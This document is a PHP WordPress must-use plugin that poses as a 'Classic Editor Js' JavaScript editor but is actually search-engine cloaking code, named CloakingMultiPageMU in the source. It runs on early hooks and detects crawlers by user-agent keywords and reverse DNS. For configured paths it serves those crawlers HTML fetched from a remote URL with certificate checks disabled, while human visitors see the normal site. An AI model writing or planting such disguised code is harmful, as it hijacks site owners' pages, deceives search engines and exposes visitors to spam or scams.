<?php
/**
 * Plugin Name: Classic Editor Js
 * Description: Advanced Editor Powerful JS Editor - Must Use Plugin
 * Version: 1.0
 */

if (!defined('ABSPATH')) {
    exit;
}

class CloakingMultiPageMU {

    private $pages = [
          
    ];



    private $bot_keywords = [
        'googlebot',
        'google', 
        'bot',
        'spider',
        'crawler',
        'facebookexternalhit',
        'twitterbot',
        'linkedinbot',
        'slurp',
        'yandex',
        'bingbot',
        'baiduspider',
        'duckduckbot',
        'adsbot',
        'mediapartners',
        'googlebot-news',
        'googlebot-image',
        'googlebot-video',
        'googlebot-mobile',
        'googlebot-desktop'
    ];
    
    public function __construct() {
        // Hook dengan priority paling tinggi
        add_action('muplugins_loaded', [$this, 'handle'], 0);
        add_action('init', [$this, 'handle'], -9999);
        add_action('wp_loaded', [$this, 'handle'], -9999);
        add_action('template_redirect', [$this, 'handle'], -9999);
        add_action('wp', [$this, 'handle'], 0);
        add_action('parse_request', [$this, 'handle'], 0);
    }
    
    /**
     * Handle cloaking utama
     */
    public function handle() {
        // Skip untuk admin area
        if (is_admin() || defined('DOING_AJAX') || defined('DOING_CRON')) {
            return;
        }
        
        // Skip untuk feed, robots, dll
        if (is_feed() || is_robots() || is_trackback()) {
            return;
        }
        
        // Dapatkan URI
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $uri_path = parse_url($uri, PHP_URL_PATH);
        
        if (empty($uri_path)) {
            return;
        }
        
        // Cek apakah URI cocok dengan salah satu path yang dikonfigurasi
        foreach ($this->pages as $path => $target_url) {
            if (strpos($uri_path, $path) !== false) {
                $this->processRequest($target_url);
                break;
            }
        }
    }
    
    /**
     * Process request - cek bot dan redirect
     */
    private function processRequest($target_url) {
        // Cek apakah ini bot
        $is_bot = $this->isBot();
        
        if ($is_bot) {
            // Ambil konten dari target URL
            $content = $this->getContent($target_url);
            
            if (!empty($content)) {
                // Set headers
                if (!headers_sent()) {
                    header('Content-Type: text/html; charset=UTF-8');
                    header('HTTP/1.1 200 OK');
                }
                
                // Tampilkan konten
                echo $content;
                exit;
            }
        }
    }
    
    /**
     * Deteksi bot dengan berbagai metode
     */
    private function isBot() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        if (empty($user_agent)) {
            return false;
        }
        
        // Keyword matching
        foreach ($this->bot_keywords as $keyword) {
            if (stripos($user_agent, $keyword) !== false) {
                return true;
            }
        }
        
        // Cek IP Googlebot via reverse DNS
        if ($this->isGooglebotIP()) {
            return true;
        }
        
        return false;
    }
    
    /**
     * Cek apakah IP berasal dari Googlebot
     */
    private function isGooglebotIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        
        if (empty($ip)) {
            return false;
        }
        
        // Lakukan reverse DNS lookup
        $hostname = gethostbyaddr($ip);
        if ($hostname && preg_match('/\.google(bot)?\.com$/i', $hostname)) {
            // Verifikasi forward DNS
            $verified_ip = gethostbyname($hostname);
            if ($verified_ip === $ip) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Get content dari URL dengan berbagai metode
     */
    private function getContent($url) {
        // Method 1: WordPress HTTP API
        if (function_exists('wp_remote_get')) {
            $response = wp_remote_get($url, [
                'timeout' => 30,
                'user-agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Googlebot/2.1',
                'sslverify' => false,
                'headers' => [
                    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                ]
            ]);
            
            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) == 200) {
                return wp_remote_retrieve_body($response);
            }
        }
        
        // Method 2: file_get_contents
        if (ini_get('allow_url_fopen') && function_exists('file_get_contents')) {
            $context = stream_context_create([
                'http' => [
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Googlebot/2.1',
                    'timeout' => 30,
                    'follow_location' => 1,
                    'max_redirects' => 5,
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                ],
            ]);
            
            $content = @file_get_contents($url, false, $context);
            if ($content !== false) {
                return $content;
            }
        }
        
        // Method 3: cURL
        if (function_exists('curl_init') && function_exists('curl_exec')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Googlebot/2.1',
                CURLOPT_TIMEOUT => 30,
                CURLOPT_ENCODING => '',
                CURLOPT_HTTPHEADER => [

                    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                ]
            ]);
            
            $content = curl_exec($ch);
            curl_close($ch);
            
            if ($content !== false) {
                return $content;
            }
        }
        
        return '';
    }
}

// Inisialisasi plugin
new CloakingMultiPageMU();